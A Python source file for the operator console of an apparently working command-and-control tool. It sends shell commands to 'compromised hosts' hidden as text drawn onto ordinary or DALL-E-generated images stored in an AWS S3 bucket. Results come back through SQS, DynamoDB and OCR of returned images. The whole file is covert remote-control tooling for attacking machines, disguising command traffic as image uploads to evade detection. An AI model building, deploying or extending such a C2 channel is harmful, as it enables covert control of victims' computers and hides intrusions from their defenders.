from PIL import Image, ImageDraw, ImageFont
import boto3
from boto3.dynamodb.conditions import Key, Attr
import pytesseract
import numpy as np
import argparse
import os
import json
import mimetypes
import random
import time
import io
import keyring
import getpass
import openai
import base64

def main(args):
    exit = False

    # Call the initFile class to check if the file exists and create it if it doesn't
    init = initFile()
    init.check(args)

    # If the flag exists, list the buckets
    bucket = bucketFunctions()

    if args.b != None:
        bucket.bucketName = args.b
    else:
        bucket.objectList = 'compromised'
        bucket.listBucket()
        print('\nEnter bucket name: ')
        bucket.bucketName = input()
    
    # Set the SQS queue
    sqs = sqsFunctions(False)
    sqs.getUrl(bucket.bucketName)

    # Set the dynamo class
    dynamo = dynamoFunction()

    print('\nIf you want to exit the app, type exit. If you want to use openai, type openai.')
    while exit == False:
        aiResponse = 'None'

        cmdProcessing = commandProcesing(init.imgDir)
        # Get the command or exit or send to openai
        print('What command do you want to send: ')
        command = input()

        if 'exit' in command.lower():
            quit()
        elif 'openai' in command.lower() and 'None' not in init.dalleKey:
            aiResponse = 'retry'
            while 'retry' in aiResponse:
                print('Type out the image you want with the command. The image needs to be clear and you will be shown the image before sending it to the host.')
                prompt = input()
                aiResponse = cmdProcessing.openAI(prompt, init.dalleKey)
        else:
            # Calls initFile to create the image
            cmdProcessing.createImage(command)
        
        if  ('None' not in aiResponse and 'exit' not in aiResponse) or 'openai' not in command:
            # Check if the command image needs to be saved
            if args.commImage == True:
                cmdProcessing.writeFile(str(time.time()), 'commImages')

            # Set the Key for the bucket and call the function
            bucket.bucketKey = 'compromised/' + bucket.bucketName + '/sendCommand/' + str(time.time()) + '.' + cmdProcessing.extension
            bucket.postBucketCommand(cmdProcessing.imageData)

            # Check the SQS for commands. This needs to check for latency issues with AWS
            i = 20
            
            while sqs.messageExist == False and i > 0:
                time.sleep(3)
                sqs.getAttributes()
                print('waiting...')

                if '0' not in sqs.messageAmount:
                    sqs.getQueue()
                i -= 1
            
            if i == 0:
                # TODO: If it hits here, a lambda function should be executed to delete anything in the SQS otherwise it will become out of sync
                print('Command lost')
            else:
                # Get the file from the bucket
                bucket.getBucketResuilt(sqs.message)

                # Process the streaming data
                cmdProcessing.streamProcess(args, bucket.streamingData)

                # Delete the key
                bucket.deleteKey(sqs.message)

                sqs.messageExist = False

                # Check if the dynamo flag is set
                if args.d == True:
                    dynamo.getTable(bucket.bucketName, command, args)
                
                if args.o == True:
                    cmdProcessing.writeFile(dynamo.currentTime, 'outImages')

class initFile:
    def __init__(self):
        self.imgDir = ''
        self.resultDir = ''
        self.fileName = 'init.json'
        self.initResult = False
        self.credStore = 'None'
        self.dalleKey = 'None'
        self.fileUpload = False
        self.directoryUpload = bucketFunctions()
        self.initKey = ''
    
    def check(self, args):
        # Check if we are reinitializing the init file
        if args.reinit == True or args.reUpload == True:
            # Get a list of files in the images directory
            print('Deleting the following files:')
            self.directoryUpload.objectList = 'images'
            self.directoryUpload.listBucket()
            for i in self.directoryUpload.objectTemp:
                self.directoryUpload.deleteKey(i)
        
        if args.reinit == True:
            print(self.fileName)
            os.remove(self.fileName)

        if args.dalleUpdate == True:
            self.dalleUpdate()

        # Check if the init file exists or if we are initializing the file 
        if os.path.isfile(self.fileName) == False or args.init == True:
            print('Enter the directory of images you want to use to send to Weaver: ')
            self.imgDir = input()
            print('Enter the directory you want to use to output images recieved from Weaver: ')
            self.resultDir = input()

            # Serialize and write the JSON
            initJson = {
                'imgDir': self.imgDir,
                'resultDir': self.resultDir,
                'uploadFile': self.fileUpload,
                'dalleCred': {
                    'method': self.credStore,
                    'key': self.initKey
                }
            }

            jsonObject = json.dumps(initJson, indent=2)
            with open(self.fileName, 'w') as outFile:
                outFile.write(jsonObject)
            
            # Check if the user has uploaded files
            self.uploadCheck(args)

        else:
            self.parse(args)
    
    def dalleUpdate(self):
        # Update the credentials for Dalle
        print('Do you want to enter a Dalle-2 API Key? y/n')
        useDalle = input()
        
        # Check if Dalle is going to be used and store the credential
        if 'y' in useDalle.lower():
            print('Enter your API key')
            self.dalleKey = getpass.getpass()
            print('Do you want to use keyring to store the credential? The alternative is placing the key in the init file which is not recommended\ny/n')
            keyRing = input()

            if 'y' in keyRing.lower():
                self.credStore = 'keyring'
                keyring.set_password('dalleKey', os.getlogin(), self.dalleKey)
                self.initKey = ''
            else:
                self.credStore = 'init'
                self.initKey = self.dalleKey

        self.update('dalle')

    def uploadCheck(self, args):
        # Check if the user wants to upload the files to Seer
        if self.fileUpload == False or args.reUpload == True:
            self.directoryUpload.uploadDirectory(self.imgDir)
            self.directoryUpload.objectList = 'images'

            # Check if the images uploaded
            self.directoryUpload.listBucket()
            print('Are the expected amount of files uploaded? By selecting n, the images will be deleted and the process will restart: (y/n)')
            uploadResult = input().lower()

            if 'n' in uploadResult:
                # Delete the files and start over
                for i in self.directoryUpload.objectTemp:
                    self.directoryUpload.deleteKey(i)
                self.uploadCheck(args)
            else:
                self.fileUpload = True
                self.update('upload')

    def parse(self, args):
        # Read the init file
        with open(self.fileName, 'r') as inFile:
            jsonObject = json.load(inFile)
        
        self.imgDir = jsonObject['imgDir']
        self.resultDir = jsonObject['resultDir']

        if 'keyring' in jsonObject['dalleCred']['method']:
            self.dalleKey = keyring.get_password('dalleKey', os.getlogin())
        else:
            self.dalleKey = jsonObject['dalleCred']['key']

        # Check if the user has uploaded files
        self.fileUpload = jsonObject['uploadFile']

        if self.fileUpload == False or args.reUpload == True:
            self.uploadCheck(args)
    
    def update(self, type):
        # Read the init file
        with open(self.fileName, 'r') as inFile:
            jsonObject = json.load(inFile)
        
        if 'upload' in type:
            jsonObject['uploadFile'] = self.fileUpload
        elif 'dalle' in type:
            jsonObject['dalleCred']['method'] = self.credStore
            jsonObject['dalleCred']['key'] = self.initKey
        
        with open(self.fileName, 'w') as outFile:
            outFile.write(json.dumps(jsonObject, indent=2))

class commandProcesing:
    def __init__(self, imgDir='', imageData=None, extension='') -> None:
        self.imgDir = imgDir
        self.imageData = imageData
        self.extension = extension
        self.image = None

    def createImage(self, command):
        isImage = False
        
        # Get a list of file names in imgDir and selects an image
        imgList = os.listdir(self.imgDir)

        while isImage == False:
            randomNum = random.randint(0, len(imgList)-1)
            mimeType = mimetypes.guess_type(imgList[randomNum])
            if 'image' in mimeType[0]:
                isImage = True
                mimeSplit = mimeType[0].split('/')
                self.extension = str(mimeSplit[1])
        
        # Adds the text to the image and places that in an object variable
        self.image = Image.open(self.imgDir + '/' + imgList[randomNum])
        textImg = ImageDraw.Draw(self.image)
        font = ImageFont.truetype("font/SourceCodePro-Regular.ttf",60)
        textImg.text((20,20), command, fill=(255,255,255), font=font)
        imgBytes = io.BytesIO()
        self.image.save(imgBytes, format=self.extension)
        self.imageData = imgBytes.getvalue()

    def streamProcess(self, args, streamData):
        # Performs the ML on the image
        self.image = Image.open(io.BytesIO(streamData.read()))
        img = np.array(self.image)
        text = pytesseract.image_to_string(img, config='--psm ' + args.p)
        print(text)

    def writeFile(self, time, directory):
        # Handles any sort of file writing
        # Check if the folder exists to write the file to
        if os.path.isdir(directory) == False:
            os.mkdir(directory)
        
        if 'commImages' in directory:
            self.image = self.image.convert('RGB')
        
        # Write the image to the directory
        self.image = self.image.save(directory + '/' + str(time) +'.jpg')
    
    def openAI(self, prompt, dalleKey):
        # Get the API key for dalle
        openai.api_key = dalleKey
        
        openaiResponse = openai.Image.create(
            prompt=prompt,
            n=1,
            size="1024x1024",
            response_format="b64_json",
        )

        # Convert the base64 to an image
        self.image = base64.b64decode(openaiResponse["data"][0]["b64_json"])
        image = Image.open(io.BytesIO(self.image))
        image.show()

        # Check if the image is what was expected
        print('Do you want to send this image to the compromised host?\nType \'retry\' to retry or \'exit\' to return to the menu.')
        response = input().lower()
        return response

# Handles anything s3 bucket related
class bucketFunctions:
    def __init__(self, streamingData = None, bucketKey = None):
        self.bucketName = ''
        self.seerBucket = 'seer-s3'
        self.s3 = boto3.client('s3')
        self.streamingData = streamingData
        self.bucketKey = bucketKey
        self.objectList = ''
        self.objectTemp = []
    
    # Print the buckets that exist
    def listBucket(self):
        response = self.s3.list_objects(
            Bucket = self.seerBucket
        )

        keys = {}

        # Build the dictionary of hosts
        for i in response['Contents']:
            splitKey = str(i['Key']).split('/')
            if self.objectList in splitKey:
                self.objectTemp.append(i['Key'])
                keys.update({splitKey[1]:'temp'})
        
        for keys, values in keys.items():
            print(keys)

    def postBucketCommand(self, imgData):
        # Puts the image with the command into the host's S3 path
        self.s3.put_object(
            Bucket=self.seerBucket,
            Body=io.BytesIO(imgData),
            Key=self.bucketKey
        )
    
    def uploadDirectory(self, directory):
        # Check if the user is ok using the directory they previously declared or use one the supply
        isDir = False

        print('\nDo you want to use the folder {} to upload to Seer or a different directory: (y/n)'.format(directory))
        dirInput = input().lower()

        if 'n' in dirInput:
            while isDir == False:
                print('What directory do you want to use?')
                directory = input()

                if os.path.exists(directory) == True:
                    isDir = True
                else:
                    print('Directory does not exist...')
        else:
            directory = os.path.abspath(directory)

        imgList = os.listdir(directory)

        # Uploads the entire folder of default images to the S3 bucket
        for object in imgList:
            mimeType = mimetypes.guess_type(object)
            
            # If the object is an image, open the file
            if 'image' in mimeType[0]:
                self.bucketKey = 'images/' + object
                self.objectTemp.append(self.bucketKey)
                self.s3.upload_file(
                    Filename = directory + '/' + object,
                    Bucket = self.seerBucket,
                    Key = self.bucketKey
                )

    def getBucketResuilt(self, key):
        # Gets the file form the S3 Bucket
        response = self.s3.get_object(
            Bucket=self.seerBucket,
            Key=key
        )

        self.streamingData = response['Body']

    def deleteKey(self, key):
        # Deletes the image after it is retrieved
        self.s3.delete_object(
            Bucket=self.seerBucket,
            Key=key
        )

class sqsFunctions:
    def __init__(self, messageExist, queueUrl={}, receiptHandle='', message='none', messageAmount='0') -> None:
        self.sqs = boto3.client('sqs')
        self.queueUrl = queueUrl
        self.receiptHandle = receiptHandle
        self.message = message
        self.messageAmount = messageAmount
        self.messageExist = messageExist

    def getUrl(self, hostname):
        # Get the URL of the compromised host
        self.queueUrl = self.sqs.get_queue_url (
            QueueName = hostname + '-Result'
        )
    
    def getAttributes(self):
        # Get the queue attributes to look for the queue to be more than 0
        response = self.sqs.get_queue_attributes (
            QueueUrl = self.queueUrl['QueueUrl'],
            AttributeNames = [
                'ApproximateNumberOfMessages'
            ]
        )
        
        self.messageAmount = response['Attributes']['ApproximateNumberOfMessages']

    def getQueue(self):
        # Get the queue and parse the required data
        result = self.sqs.receive_message (
            QueueUrl = self.queueUrl['QueueUrl'],
            MaxNumberOfMessages=1,
            MessageAttributeNames=[
                'All'
                ]
        )
        
        # There seems to be a race condition here caused by SQS latency. Because of that, sometimes messages in flight will toss back to available then delete.
        # According to Amazon, this is because a random server might still have the message. Because of that, this check needs to exist 
        try:
            self.receiptHandle = result['Messages'][0]['ReceiptHandle']
            self.message = result['Messages'][0]['MessageAttributes']['Path']['StringValue']
            self.messageExist = True
            self.deleteMessage()  
        except:
            self.messageAmount = '0' 

    def deleteMessage(self):
        # Delete the message so it doesn't process the command again
        response = self.sqs.delete_message (
            QueueUrl = self.queueUrl['QueueUrl'],
            ReceiptHandle = self.receiptHandle
        )

class dynamoFunction():
    # Contains any functions related to dynamodb
    def __init__(self):
        self.dynamo = boto3.client('dynamodb')
        self.currentTime = time.time()

    def getTable(self, hostname, command, args):
        # Get the command based on the time
        response = self.dynamo.query (
            TableName = hostname,
            IndexName = 'command-index',
            KeyConditionExpression = 'command = :command AND sortTime >= :sortTime',
            ExpressionAttributeValues = {
                ':command': {'S':command},
                ':sortTime': {'N':str(self.currentTime)}
            }
        )

        # Print the result and update the time
        print('Dynamo Entry:\n',response['Items'][0]['result']['S'])
        self.currentTime = float(response['Items'][0]['commandTime']['N'])
        
        if args.de == True:
            self.deleteEntry(hostname)

    def deleteEntry(self, hostname):
        self.dynamo.delete_item(
            TableName = hostname,
            Key = {'commandTime': {'N': str(self.currentTime)}}
        )

# TODO Refine the algorithms for both Weaver and Seer

if __name__ == "__main__":
    # Setup the argparse
    parse = argparse.ArgumentParser()
    parse.add_argument('-p', help='Sets the PSM level. The default is 1', type=str, default='1')
    parse.add_argument('-d', help='Enables retrieving data from dynamo', action='store_true')
    parse.add_argument('-de', help='Deletes the entry within dynamodb', action='store_true')
    parse.add_argument('-l', help='Lists the hosts in the s3 bucket', action='store_true')
    parse.add_argument('-o', help='Output the images received from the compromised host', action='store_true')
    parse.add_argument('--commImage', help='Outputs the command image', action='store_true')
    parse.add_argument('-b', help='Sets the bucket to pull data from', type=str)
    parse.add_argument('--init', help='Initialize the config file', action='store_true')
    parse.add_argument('--reinit', help='Reinitializes the config file', action='store_true')
    parse.add_argument('--reUpload', help='Reuploads images to the s3 bucket', action='store_true')
    parse.add_argument('--dalleUpdate', help='Updates the key used for Dalle', action='store_true')
    args = parse.parse_args()

    main(args)